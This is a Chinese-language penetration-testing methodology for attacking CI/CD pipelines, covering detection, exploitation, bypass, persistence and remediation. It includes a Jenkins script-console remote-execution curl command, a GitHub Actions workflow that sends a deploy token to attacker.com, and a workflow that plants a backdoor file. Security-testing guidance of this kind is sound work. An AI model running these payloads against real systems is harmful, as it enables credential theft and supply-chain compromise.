# CI/CD 管道入侵方法论

---

# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化的 CI/CD 管道安全检测和利用流程。

## 1.2 适用范围

本文档适用于使用 CI/CD 系统（Jenkins、GitHub Actions、GitLab CI 等）的组织。

## 1.3 读者对象

本文件主要面向执行渗透测试任务的安全工程师、安全分析师。

---

# 第二部分：核心渗透技术专题

## 2.1 技术介绍

### 漏洞原理

CI/CD 管道入侵是指攻击者通过利用 CI/CD 系统的配置缺陷或漏洞，获取构建系统访问权限，进而植入恶意代码、窃取凭证或破坏软件供应链。

**常见攻击面**：
- 未认证的 Jenkins 实例
- 过宽的 GitHub Actions 权限
- 泄露的 CI/CD 凭证
- 不安全的构建脚本

### 常见 CWE 映射

| CWE 编号 | 描述 |
|---------|------|
| CWE-732 | 危险资源权限分配 |
| CWE-798 | 使用硬编码凭证 |
| CWE-829 | 从不可信控制域包含功能 |

## 2.2 攻击常见于哪些业务场景

| CI/CD 系统 | 风险点 | 潜在危害 |
|-----------|-------|---------|
| Jenkins | 未认证访问 | 远程代码执行 |
| GitHub Actions | 权限过宽 | 凭证窃取 |
| GitLab CI | 配置泄露 | 管道篡改 |
| CircleCI | API 令牌泄露 | 构建劫持 |
| Travis CI | 环境变量泄露 | 密钥窃取 |

## 2.3 漏洞发现方法

### 2.3.1 Jenkins 检测

```bash
# 扫描 Jenkins 实例
nmap --script http-jenkins -p 8080 target.com

# 检查是否无需认证
curl http://target.com:8080/api/json

# 检查脚本控制台
curl http://target.com:8080/script
```

### 2.3.2 GitHub Actions 检测

```yaml
# 检查 workflow 配置
# .github/workflows/*.yml

# 风险配置：
# - permissions: write-all
# - 使用 pull_request_target
# -  checkout 第三方 PR 代码
```

### 2.3.3 凭证泄露检测

```bash
# 扫描代码仓库中的凭证
trufflehog git https://github.com/target/repo

# 检查 CI/CD 环境变量
# 某些系统会泄露部分环境变量
```

## 2.4 漏洞利用方法

### 2.4.1 Jenkins 远程代码执行

```bash
# 如果 Jenkins 脚本控制台可访问
# 执行 Groovy 脚本

curl -X POST http://target.com:8080/scriptText \
    -d "script=println 'whoami'.execute().text"

# 获取服务器权限后：
# 1. 窃取部署凭证
# 2. 修改构建脚本
# 3. 植入恶意代码
```

### 2.4.2 GitHub Actions 凭证窃取

```yaml
# 恶意 workflow
name: Steal Secrets
on: push
jobs:
  steal:
    runs-on: ubuntu-latest
    steps:
      - name: Exfiltrate
        run: |
          curl -X POST https://attacker.com/collect \
            -H "Authorization: ${{ secrets.DEPLOY_TOKEN }}"
```

### 2.4.3 构建脚本篡改

```yaml
# 篡改 .github/workflows/build.yml
name: Build
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      
      # 恶意步骤
      - name: Backdoor
        run: |
          # 植入后门代码
          echo "backdoor" >> src/backdoor.py
          
      - name: Build
        run: npm install && npm build
```

### 2.4.4 依赖投毒通过 CI/CD

```bash
# 在构建过程中修改依赖
# package.json 添加恶意包
# 或修改现有包的版本
```

## 2.5 漏洞利用绕过方法

### 2.5.1 分支保护绕过

```bash
# 如果分支保护未启用
# 直接推送到 main 分支

# 如果 PR 审查未强制
# 自审自合并
```

### 2.5.2 权限提升

```bash
# 利用 CI/CD 的过高权限
# 访问其他仓库
# 访问云资源
# 访问内部网络
```

### 2.5.3 持久化

```bash
# 在 CI/CD 系统中持久化
# 1. 创建新的访问凭证
# 2. 修改系统配置
# 3. 植入持久化脚本
```

---

# 第三部分：附录

## 3.1 CI/CD 安全测试检查清单

```
□ 检查 Jenkins 认证配置
□ 检查 GitHub Actions 权限
□ 检查凭证存储安全
□ 检查构建脚本完整性
□ 检查依赖来源可信度
□ 检查部署流程安全
□ 检查分支保护配置
```

## 3.2 常用工具

| 工具 | 用途 | 链接 |
|-----|------|------|
| trufflehog | 凭证扫描 | https://github.com/trufflesecurity/trufflehog |
| Jenkins CLI | Jenkins 管理 | Jenkins 内置 |
| Gitleaks | 密钥扫描 | https://github.com/gitleaks/gitleaks |

## 3.3 修复建议

1. **启用认证** - 所有 CI/CD 系统强制认证
2. **最小权限** - 使用最小必要权限
3. **凭证管理** - 使用秘密管理系统
4. **代码审查** - 所有构建脚本变更需审查
5. **审计日志** - 记录所有 CI/CD 操作

---

**参考资源**：
- [OWASP CI/CD Security](https://owasp.org/www-project-devsecops-guideline/)
- [GitHub Actions Security](https://docs.github.com/en/actions/security-guides)
